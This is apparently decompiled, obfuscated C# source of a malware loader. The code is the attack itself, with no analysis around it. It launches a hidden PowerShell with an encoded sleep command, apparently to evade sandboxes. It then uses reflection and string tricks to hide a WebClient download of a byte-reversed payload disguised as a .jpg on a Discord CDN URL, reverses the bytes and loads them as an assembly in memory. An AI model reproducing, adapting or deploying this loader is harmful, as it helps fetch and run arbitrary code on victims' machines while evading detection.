using System;
using System.Diagnostics;
using System.Net;
using System.Reflection;

internal static class Facade
{
	internal static Facade ForgotItem;

	private static byte[] ChangeFacade()
	{
		//Discarded unreachable code: IL_0082, IL_00b3, IL_00c2, IL_00fd, IL_010c
		int num = 2;
		int num2 = num;
		byte[] array = default(byte[]);
		bool flag = default(bool);
		byte[] result = default(byte[]);
		while (true)
		{
			switch (num2)
			{
			default:
				InsertItem(array, 0, array.Length);
				goto IL_004d;
			case 1:
				try
				{
					if (7 == 0)
					{
						int num4 = 0;
						if (_003CModule_003E_007B89a366a7_002D2270_002D4665_002D8440_002Dcb5a27ea74fd_007D.m_18e83840fb16471f9ac9b1c06fe3b551 == 0)
						{
							num4 = 0;
						}
						switch (num4)
						{
						case 0:
							break;
						}
					}
					else
					{
						ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
					}
				}
				catch
				{
				}
				goto case 5;
			case 3:
				if (flag)
				{
					goto default;
				}
				goto IL_004d;
			case 2:
				ValidateItem();
				num2 = 1;
				if (_003CModule_003E_007B89a366a7_002D2270_002D4665_002D8440_002Dcb5a27ea74fd_007D.m_9179646c7ab74c0b8be4bd7bd3bba8c5 == 0)
				{
					num2 = 1;
				}
				break;
			case 5:
			{
				byte[] obj2 = (byte[])UpdateItem(typeof(WebClient).GetMethod("DxownxloxadDxatxxax".Replace("x", ""), new Type[1] { MoveItem(typeof(string).TypeHandle) }), new WebClient(), new object[1] { "https://cdn.discordapp.com/attachments/928503440139771947/930108637681184768/Tbopbh.jpg" });
				if (5 == 0)
				{
					num2 = 4;
					break;
				}
				array = obj2;
				num2 = 6;
				break;
			}
			case 7:
				return result;
			case 4:
			case 6:
				{
					bool num3 = array.Length > 1;
					if (1 == 0)
					{
						num2 = 3;
						if (_003CModule_003E_007B89a366a7_002D2270_002D4665_002D8440_002Dcb5a27ea74fd_007D.m_2c14d7a09b2547d0bb8f361f957318cd == 0)
						{
							num2 = 1;
						}
						break;
					}
					flag = num3;
					goto case 3;
				}
				IL_004d:
				result = array;
				num2 = 7;
				break;
			}
		}
	}

	public static Assembly PrintFacade()
	{
		int num = 3;
		int num2 = num;
		Assembly assembly = default(Assembly);
		Assembly result = default(Assembly);
		while (true)
		{
			switch (num2)
			{
			case 3:
			{
				object obj = LogoutItem(ChangeFacade());
				if (2 == 0)
				{
					num2 = 2;
					break;
				}
				assembly = (Assembly)obj;
				num2 = 1;
				if (_003CModule_003E_007B89a366a7_002D2270_002D4665_002D8440_002Dcb5a27ea74fd_007D.m_df0641c336ee48538c46b1840d202e14 != 0)
				{
					num2 = 0;
				}
				break;
			}
			case 1:
			case 2:
			{
				Assembly result2 = assembly;
				if (5 == 0)
				{
					num2 = 0;
					if (_003CModule_003E_007B89a366a7_002D2270_002D4665_002D8440_002Dcb5a27ea74fd_007D.m_2c14d7a09b2547d0bb8f361f957318cd == 0)
					{
						num2 = 0;
					}
					break;
				}
				return result2;
			}
			default:
				return result;
			}
		}
	}

	private static void ReflectFacade()
	{
		//Discarded unreachable code: IL_005e, IL_006d, IL_00c1
		int num = 8;
		string text = default(string);
		int num3 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 1:
				case 3:
				case 4:
				case 9:
					break;
				case 6:
				{
					InitItem(SetItem(new ProcessStartInfo
					{
						FileName = "powershell",
						Arguments = (string)SearchItem("-enc UwB0AGEAcgB0AC", text),
						WindowStyle = ProcessWindowStyle.Hidden
					}));
					int num4 = num3 + 1;
					if (2 == 0)
					{
						num2 = 4;
						continue;
					}
					num3 = num4;
					num2 = 9;
					continue;
				}
				case 2:
					if (flag)
					{
						goto case 6;
					}
					return;
				case 5:
					return;
				default:
					if (-1 == 0)
					{
						break;
					}
					num3 = 0;
					num2 = 0;
					if (_003CModule_003E_007B89a366a7_002D2270_002D4665_002D8440_002Dcb5a27ea74fd_007D.m_1a02f8da48ac406c98d9cad8ca377c5b == 0)
					{
						num2 = 1;
					}
					continue;
				case 8:
					if (1 == 0)
					{
						num2 = 7;
						if (_003CModule_003E_007B89a366a7_002D2270_002D4665_002D8440_002Dcb5a27ea74fd_007D.m_c453dd665fd6487ebddc9fcbd90eb584 == 0)
						{
							num2 = 7;
						}
						continue;
					}
					text = "0AUwBsAGUAZQBwACAALQBzACAAMQAwAA==";
					num2 = 0;
					if (_003CModule_003E_007B89a366a7_002D2270_002D4665_002D8440_002Dcb5a27ea74fd_007D.m_2f890ae8a28c4805a87fc61c4170c21d == 0)
					{
						num2 = 0;
					}
					continue;
				}
				break;
			}
			flag = num3 < 2;
			num = 2;
		}
	}

	internal static void ValidateItem()
	{
		ReflectFacade();
	}

	internal static Type MoveItem(RuntimeTypeHandle P_0)
	{
		return Type.GetTypeFromHandle(P_0);
	}

	internal static object UpdateItem(object P_0, object P_1, object P_2)
	{
		return ((MethodBase)P_0).Invoke(P_1, (object[])P_2);
	}

	internal static void InsertItem(object P_0, int P_1, int P_2)
	{
		Array.Reverse((Array)P_0, P_1, P_2);
	}

	internal static bool CollectItem()
	{
		return ForgotItem == null;
	}

	internal static Facade FillItem()
	{
		return ForgotItem;
	}

	internal static object LogoutItem(object P_0)
	{
		return Assembly.Load((byte[])P_0);
	}

	internal static object SearchItem(object P_0, object P_1)
	{
		return (string)P_0 + (string)P_1;
	}

	internal static object SetItem(object P_0)
	{
		return Process.Start((ProcessStartInfo)P_0);
	}

	internal static void InitItem(object P_0)
	{
		((Process)P_0).WaitForExit();
	}
}
